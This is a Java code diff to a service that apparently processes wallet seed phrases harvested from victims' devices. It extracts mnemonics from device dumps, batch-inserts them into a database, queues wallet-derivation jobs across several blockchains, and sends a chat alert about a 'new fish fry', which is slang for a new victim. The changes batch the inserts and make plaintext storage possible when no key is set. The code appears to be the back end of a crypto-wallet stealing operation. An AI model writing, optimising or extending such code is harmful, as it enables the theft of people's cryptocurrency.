@@ -7,6 +7,7 @@ import com.consumer.dao.DeviceDao;
 import com.consumer.dao.MnemonicDao;
 import com.consumer.entity.DeviceEntity;
 import com.consumer.entity.MnemonicEntity;
+import com.consumer.util.MnemonicAesUtil;
 import com.consumer.util.RedisPush;
 
 import lombok.extern.slf4j.Slf4j;
@@ -15,7 +16,6 @@ import org.springframework.stereotype.Service;
 
 import javax.annotation.PostConstruct;
 import javax.annotation.Resource;
-import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
 import java.io.IOException;
@@ -53,14 +53,10 @@ public class ParseCiHandler {
     @PostConstruct
     public void initAesKey() {
         try {
-            byte[] key = consumerProps.getMnemonicAesKey().getBytes(StandardCharsets.UTF_8);
-            // AES-256：密钥必须 32 字节
-            if (key.length != 32) {
-                log.warn("mnemonic-aes-key length={} (expected 32 for AES-256), padding/truncating",
-                        key.length);
-                key = Arrays.copyOf(key, 32);
+            this.aesKey = MnemonicAesUtil.resolveKey(consumerProps.getMnemonicAesKey());
+            if (this.aesKey == null) {
+                log.info("【parse_ci】mnemonic-aes-key 未配置，助记词明文入库");
             }
-            this.aesKey = new SecretKeySpec(key, "AES");
         } catch (Exception e) {
             log.error("initAesKey FAIL: {}", e.toString());
         }
@@ -93,18 +89,25 @@ public class ParseCiHandler {
         }
         Integer id = Integer.parseInt(idStr);
 
-        // 提取所有钱包的助记词
+        // 提取助记词：有 unpack 先只扫磁盘（避免再读 1MB+ .bin）；磁盘无结果再读 bin 兜底
         List<MnemonicExtractor.PhraseResult> allPhrases = Collections.emptyList();
-        if (!filePath.isEmpty()) {
-            long tRead = System.currentTimeMillis();
-            byte[] binBytes = readSmallBin(filePath, 32 * 1024 * 1024);
-            if (binBytes.length == 0) {
-                log.warn("【parse_ci】war JSON 文件为空或不存在 id={} file={}", id, filePath);
+        long tRead = System.currentTimeMillis();
+        long tParse = tRead;
+        long tExtract = tRead;
+        try {
+            MnemonicExtractor.Ctx ctx = new MnemonicExtractor.Ctx(id, deviceId);
+            if (!unpackPath.isEmpty()) {
+                tExtract = System.currentTimeMillis();
+                allPhrases = mnemonicExtractor.extractAll(null, unpackPath, ctx);
             }
-            long tParse = System.currentTimeMillis();
-            try {
+            if (allPhrases.isEmpty() && !filePath.isEmpty()) {
+                tRead = System.currentTimeMillis();
+                byte[] binBytes = readSmallBin(filePath, 32 * 1024 * 1024);
+                if (binBytes.length == 0) {
+                    log.warn("【parse_ci】war JSON 文件为空或不存在 id={} file={}", id, filePath);
+                }
+                tParse = System.currentTimeMillis();
                 String rawJson = new String(binBytes, StandardCharsets.UTF_8);
-                // 兼容：war 数据可能嵌套在 {"data": {...}} / {"payload": {...}} 里，尝试穿透
                 Object parsedTop = JSON.parse(rawJson);
                 if (parsedTop instanceof JSONObject) {
                     JSONObject top = (JSONObject) parsedTop;
@@ -120,93 +123,119 @@ public class ParseCiHandler {
                             }
                         }
                     }
-                    long tExtract = System.currentTimeMillis();
-                    allPhrases = mnemonicExtractor.extractAll(top, unpackPath,
-                            new MnemonicExtractor.Ctx(id, deviceId));
-                    long tDone = System.currentTimeMillis();
-                    log.info("【parse_ci】提取完成 id={} 助记词数量={} 耗耗: 读文件={}ms 解析JSON={}ms 提取助记词={}ms 总计={}ms",
-                            id, allPhrases.size(), tParse - tRead, tExtract - tParse, tDone - tExtract, tDone - t0);
+                    tExtract = System.currentTimeMillis();
+                    allPhrases = mnemonicExtractor.extractAll(top, unpackPath, ctx);
                 }
-            } catch (Exception e) {
-                log.warn("【parse_ci】war JSON 解析失败 id={} err={}", id, e.toString());
+            } else if (unpackPath.isEmpty() && filePath.isEmpty()) {
+                log.info("【parse_ci】提取完成 id={} 助记词数量=0 (file_path/unpack_path 均为空)", id);
             }
-        } else {
-            log.info("【parse_ci】提取完成 id={} 助记词数量=0 (file_path 为空)", id);
+            long tDone = System.currentTimeMillis();
+            log.info("【parse_ci】提取完成 id={} 助记词数量={} 耗时: 读文件={}ms 解析JSON={}ms 提取助记词={}ms 总计={}ms",
+                    id, allPhrases.size(),
+                    Math.max(0, tParse - tRead), Math.max(0, tExtract - tParse),
+                    Math.max(0, tDone - tExtract), tDone - t0);
+        } catch (Exception e) {
+            log.warn("【parse_ci】提取失败 id={} err={}", id, e.toString());
         }
         double now = System.currentTimeMillis() / 1000.0;
+        long tPersist0 = System.currentTimeMillis();
         // 循环外只查一次 device，避免 N 个助记词查 N 次 DB
         DeviceEntity deviceEntity = null;
         try { deviceEntity = deviceDao.findByDeviceid(deviceId); }
         catch (Exception e) { log.warn("【parse_ci】查询device失败 id={} device={} err={}", id, deviceId, e.toString()); }
         String channelcode = deviceEntity == null ? null : deviceEntity.getChannelCode();
 
-        int idx = 0;
-        int newlyInserted = 0;
-        // 批量收集 news4 jobs，最后用 pipeline 一次性发送，减少 N 次 Redis 往返
-        List<Map<String, String>> news4Jobs = new ArrayList<>(allPhrases.size());
+        // 一次拉齐该 device 已有 source|hash，替代 N 次 findIdByDeviceSourceHash
+        java.util.Set<String> existKeys = new java.util.HashSet<>();
+        try {
+            List<String> keys = mnemonicDao.listSourceHashKeysByDevice(deviceId);
+            if (keys != null) existKeys.addAll(keys);
+        } catch (Exception e) {
+            log.warn("【parse_ci】批量幂等预查失败 id={} device={} err={}，降级逐条插入",
+                    id, deviceId, e.toString());
+        }
+
+        int skippedExist = 0;
+        int skippedDupInBatch = 0;
+        List<MnemonicEntity> toInsert = new ArrayList<>(allPhrases.size());
         java.util.Set<String> batchInserted = new java.util.HashSet<>();
         for (MnemonicExtractor.PhraseResult r : allPhrases) {
-            idx++;
             String phrasePlain = r.getPhrase();
+            if (phrasePlain == null || phrasePlain.isEmpty()) continue;
 
             String phraseHash = sha256Hex(phrasePlain.getBytes(StandardCharsets.UTF_8));
             String batchKey = (r.getWallet() == null ? "" : r.getWallet().toLowerCase()) + "|" + phraseHash;
             if (!batchInserted.add(batchKey)) {
-                log.info("【parse_ci】本批重复跳过 id={} source={} hash={}", id, r.getWallet(), phraseHash);
+                skippedDupInBatch++;
+                continue;
+            }
+            if (existKeys.contains(batchKey)) {
+                skippedExist++;
                 continue;
             }
 
-            // 幂等：同 device+source+hash 已入库则跳过（parse_ci 重试/重复入队时不重复写）
-            try {
-                Integer existId = mnemonicDao.findIdByDeviceSourceHash(deviceId, r.getWallet(), phraseHash);
-                if (existId != null) {
-                    log.info("【parse_ci】mnemonic 幂等命中跳过 id={} exist_id={} source={} hash={}",
-                            id, existId, r.getWallet(), phraseHash);
-                    continue;
-                }
-            } catch (Exception e) {
-                log.warn("【parse_ci】mnemonic 幂等查询失败 id={} source={} hash={} err={}",
-                        id, r.getWallet(), phraseHash, e.toString());
-            }
-
             String phraseEnc = aesEncrypt(phrasePlain);
-            int wordCount = r.getWordCount();
-
             MnemonicEntity me = new MnemonicEntity();
             me.setDeviceId(deviceId);
-            me.setWordscount(wordCount);
+            me.setWordscount(r.getWordCount());
             me.setChannelcode(channelcode);
             me.setResult(phraseEnc);
             me.setSource(r.getWallet());
             me.setStatus(1);
             me.setPhraseHash(phraseHash);
             me.setAddtime(now);
-            try {
-                mnemonicDao.insert(me);
-                newlyInserted++;
-            } catch (Exception e) {
-                // 同 device+source+hash 唯一键冲突时跳过该条，继续后续（exodus/coin98 并行入库）
-                log.warn("【parse_ci】mnemonic insert 跳过 id={} source={} hash={} err={}",
-                        id, r.getWallet(), phraseHash, e.toString());
-                continue;
-            }
+            toInsert.add(me);
+        }
 
-            // 收集 wallet_derive job，稍后批量发送
-            if (consumerProps.isNews4TaskEnabled() && me.getId() != null) {
-                Map<String, String> job = new HashMap<>();
-                job.put("job", "wallet_derive");
-                job.put("ios18param_id", String.valueOf(id));
-                job.put("mnemonic_id", String.valueOf(me.getId()));
-                job.put("device_id", firstNonEmpty(deviceId, ""));
-                job.put("phrase_hash", firstNonEmpty(phraseHash, ""));
-                job.put("address_idx", "0");
-                job.put("chains", "tron,eth,bsc,btc,sol");
-                job.put("source", firstNonEmpty(me.getSource(), ""));
-                news4Jobs.add(job);
-                log.info("【parse_ci】news4 wallet_derive 待入队 mnemonic_id={} device={} source={}",
-                        me.getId(), deviceId, me.getSource());
+        int newlyInserted = 0;
+        List<Map<String, String>> news4Jobs = new ArrayList<>(toInsert.size());
+        if (!toInsert.isEmpty()) {
+            boolean batchOk = false;
+            try {
+                mnemonicDao.insertBatch(toInsert);
+                batchOk = true;
+                newlyInserted = toInsert.size();
+                // 个别驱动未回填 id 时，补一次按 hash 查 id，保证 news4 能入队
+                for (MnemonicEntity me : toInsert) {
+                    if (me.getId() != null) continue;
+                    try {
+                        Integer eid = mnemonicDao.findIdByDeviceSourceHash(
+                                me.getDeviceId(), me.getSource(), me.getPhraseHash());
+                        if (eid != null) me.setId(eid);
+                    } catch (Exception ignore) {}
+                }
+            } catch (Exception e) {
+                log.warn("【parse_ci】批量 insert 失败，降级逐条 id={} size={} err={}",
+                        id, toInsert.size(), e.toString());
+            }
+            if (!batchOk) {
+                for (MnemonicEntity me : toInsert) {
+                    try {
+                        mnemonicDao.insert(me);
+                        newlyInserted++;
+                    } catch (Exception e) {
+                        log.warn("【parse_ci】mnemonic insert 跳过 id={} source={} hash={} err={}",
+                                id, me.getSource(), me.getPhraseHash(), e.toString());
+                    }
+                }
+            }
+            if (consumerProps.isNews4TaskEnabled()) {
+                for (MnemonicEntity me : toInsert) {
+                    if (me.getId() == null) continue;
+                    Map<String, String> job = new HashMap<>();
+                    job.put("job", "wallet_derive");
+                    job.put("ios18param_id", String.valueOf(id));
+                    job.put("mnemonic_id", String.valueOf(me.getId()));
+                    job.put("device_id", firstNonEmpty(deviceId, ""));
+                    job.put("phrase_hash", firstNonEmpty(me.getPhraseHash(), ""));
+                    job.put("address_idx", "0");
+                    job.put("chains", "tron,eth,bsc,btc,sol");
+                    job.put("source", firstNonEmpty(me.getSource(), ""));
+                    news4Jobs.add(job);
+                }
             }
         }
+
         // 批量推送 news4:tasks（pipeline 单连接多 XADD）
         if (!news4Jobs.isEmpty()) {
             try {
@@ -216,6 +245,9 @@ public class ParseCiHandler {
                 log.error("【parse_ci】enqueueWalletDerive batch FAIL device={} err={}", deviceId, t.toString());
             }
         }
+        log.info("【parse_ci】入库完成 id={} inserted={} skip_exist={} skip_batch_dup={} persist={}ms news4_jobs={}",
+                id, newlyInserted, skippedExist, skippedDupInBatch,
+                System.currentTimeMillis() - tPersist0, news4Jobs.size());
         // 本批有新助记词入库 → 异步飞机「新鱼苗」通知（同批多 wallet 只发一次）
         if (newlyInserted > 0 && deviceEntity != null) {
             try {
@@ -252,15 +284,7 @@ public class ParseCiHandler {
     // ==================== 工具方法 ====================
 
     private String aesEncrypt(String plain) throws Exception {
-        SecretKeySpec key = this.aesKey;
-        if (key == null) {
-            log.warn("aesKey not initialized, skip encrypt");
-            return "";
-        }
-        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
-        c.init(Cipher.ENCRYPT_MODE, key);
-        byte[] enc = c.doFinal(plain.getBytes(StandardCharsets.UTF_8));
-        return Base64.getEncoder().encodeToString(enc);
+        return MnemonicAesUtil.encodeForStorage(plain, this.aesKey);
     }
 
     private static byte[] readSmallBin(String path, int max) throws IOException {
